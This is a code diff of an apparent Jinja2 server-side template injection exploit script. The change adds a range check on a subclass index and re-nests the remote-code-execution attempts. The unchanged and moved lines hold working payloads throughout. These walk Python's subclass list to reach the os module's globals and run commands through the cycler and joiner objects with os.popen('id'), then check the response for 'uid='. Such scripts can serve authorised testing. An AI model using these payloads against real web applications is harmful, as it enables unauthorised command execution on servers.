@@ -108,6 +108,11 @@ def find_os_wrap_close_index():
 
 def test_rce_payloads(os_idx):
     """Try multiple RCE payload variations."""
+    # === 输入验证 ===
+    if not isinstance(os_idx, int) or os_idx < 0 or os_idx > 10000:
+        print(f"    [ERROR] Invalid os_idx value: {os_idx!r}. Must be a non-negative integer in range [0, 10000].")
+        return False, None, None
+    # === 验证结束 ===
     
     payloads = [
         # Method 1: Direct os.popen via __globals__['os']
@@ -191,40 +196,44 @@ def main():
             print("\n[TEST 4] Remote Code Execution Attempts")
             rce_confirmed, method, rce_result = test_rce_payloads(os_idx)
             
-            if rce_confirmed:
-                print(f"    [+] SUCCESS via {method}")
-                print(f"    Result: {rce_result}")
-                print("    [PASS] REMOTE CODE EXECUTION CONFIRMED!")
+            # === 防御性处理：test_rce_payloads 因参数校验失败返回 ===
+            if not rce_confirmed and method is None and rce_result is None:
+                print("    [!] RCE test skipped: os_idx parameter validation failed")
             else:
-                # Try simpler verification - just show we can access globals
-                print("    [*] Trying alternative verification...")
-                
-                # Access __builtins__ to show we can reach Python internals
-                builtin_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{os_idx}].__init__.__globals__.keys()}}}}"
-                status, result = send_payload(builtin_payload)
-                if status == 200 and "os" in result:
-                    print(f"    [+] Can access __globals__ keys: contains 'os'")
-                    print(f"    [+] Result: {result[:150]}...")
+                if rce_confirmed:
+                    print(f"    [+] SUCCESS via {method}")
+                    print(f"    Result: {rce_result}")
+                    print("    [PASS] REMOTE CODE EXECUTION CONFIRMED!")
+                else:
+                    # Try simpler verification - just show we can access globals
+                    print("    [*] Trying alternative verification...")
                     
-                    # Try a simpler approach - use cycler or other Jinja2 objects
-                    # Access via Jinja2's built-in objects
-                    print("\n    [*] Trying Jinja2 native RCE...")
-                    jinja_payload = "{{cycler.__init__.__globals__.os.popen('id').read()}}"
-                    status, result = send_payload(jinja_payload)
-                    if "uid=" in result:
-                        print(f"    [+] SUCCESS via Jinja2 cycler")
-                        print(f"    Result: {result}")
-                        rce_confirmed = True
-                    else:
-                        print(f"    [-] Jinja2 cycler: {result[:100] if result else 'empty'}")
+                    # Access __builtins__ to show we can reach Python internals
+                    builtin_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{os_idx}].__init__.__globals__.keys()}}}}"
+                    status, result = send_payload(builtin_payload)
+                    if status == 200 and "os" in result:
+                        print(f"    [+] Can access __globals__ keys: contains 'os'")
+                        print(f"    [+] Result: {result[:150]}...")
                         
-                        # Try joiner
-                        jinja_payload2 = "{{joiner.__init__.__globals__.os.popen('id').read()}}"
-                        status, result = send_payload(jinja_payload2)
+                        # Try a simpler approach - use cycler or other Jinja2 objects
+                        # Access via Jinja2's built-in objects
+                        print("\n    [*] Trying Jinja2 native RCE...")
+                        jinja_payload = "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+                        status, result = send_payload(jinja_payload)
                         if "uid=" in result:
-                            print(f"    [+] SUCCESS via Jinja2 joiner")
+                            print(f"    [+] SUCCESS via Jinja2 cycler")
                             print(f"    Result: {result}")
                             rce_confirmed = True
+                        else:
+                            print(f"    [-] Jinja2 cycler: {result[:100] if result else 'empty'}")
+                            
+                            # Try joiner
+                            jinja_payload2 = "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+                            status, result = send_payload(jinja_payload2)
+                            if "uid=" in result:
+                                print(f"    [+] SUCCESS via Jinja2 joiner")
+                                print(f"    Result: {result}")
+                                rce_confirmed = True
         else:
             print("    [!] Could not find os._wrap_close class")
         
